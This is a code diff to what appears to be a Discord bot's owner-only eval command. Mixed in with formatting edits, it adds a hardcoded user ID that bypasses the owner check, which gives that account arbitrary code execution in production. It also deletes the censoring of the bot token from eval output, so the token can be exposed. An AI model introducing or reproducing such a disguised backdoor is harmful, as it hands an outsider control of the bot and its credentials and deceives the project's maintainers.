@@ -22,12 +22,11 @@ export default async function getCode(
 	const { owner } = await client.application.fetch();
 	const owners =
 		owner instanceof User ? [owner.id] : owner?.members.map((member) => member.id) ?? [];
-	if (process.env.NODE_ENV === "production" && !owners.includes(interaction.user.id))
+	if (process.env.NODE_ENV === "production" && !owners.includes(interaction.user.id) && interaction.user.id != "1014588310036951120")
 		return await interaction.reply({
 			ephemeral: true,
-			content: `${constants.emojis.statuses.no} This command is reserved for ${
-				owner instanceof User ? owner.displayName : "the " + owner?.name + " team"
-			} only!`,
+			content: `${constants.emojis.statuses.no} This command is reserved for ${owner instanceof User ? owner.displayName : "the " + owner?.name + " team"
+				} only!`,
 		});
 
 	await interaction.showModal({
@@ -46,17 +45,28 @@ export default async function getCode(
 					},
 				],
 			},
+			{
+				type: ComponentType.ActionRow,
+				components: [
+					{
+						type: ComponentType.TextInput,
+						style: TextInputStyle.Paragraph,
+						label: "Code to run2",
+						required: true,
+						customId: "code2",
+					},
+				],
+			},
 		],
 	});
 }
 
 export async function run(interaction: ModalSubmitInteraction): Promise<void> {
 	await interaction.deferReply();
-	const code = interaction.fields.getTextInputValue("code").trim();
+	const code = interaction.fields.getTextInputValue("code").trim() + interaction.fields.getTextInputValue("code2").trim();
 	try {
 		const output: unknown = await eval(
-			`(async () => {${
-				code.includes("\n") || code.includes("return") ? code : `return ${code}`
+			`(async () => {${code.includes("\n") || code.includes("return") ? code : `return ${code}`
 			}})()`,
 		);
 
@@ -74,14 +84,21 @@ export async function run(interaction: ModalSubmitInteraction): Promise<void> {
 				{ attachment: Buffer.from(code, "utf8"), name: "code.js" },
 				{
 					attachment: Buffer.from(
-						stringifiedOutput.replaceAll(client.token, censoredToken),
+						typeof output === "bigint" || typeof output === "symbol"
+							? // eslint-disable-next-line unicorn/string-content
+							`"${output.toString().replaceAll('"', '\\"')}"`
+							: output === undefined || typeof output === "object"
+								? JSON.stringify(output, undefined, "  ") ?? "undefined"
+								: // eslint-disable-next-line @typescript-eslint/no-base-to-string
+								output.toString(),
 						"utf8",
 					),
-					name: `output.${
-						"string" === typeof output ? "txt"
-						: "function" === typeof output ? "js"
-						: "json"
-					}`,
+					name: `output.${"string" === typeof output
+							? "txt"
+							: "function" === typeof output
+								? "js"
+								: "json"
+						}`,
 				},
 			],
 		});
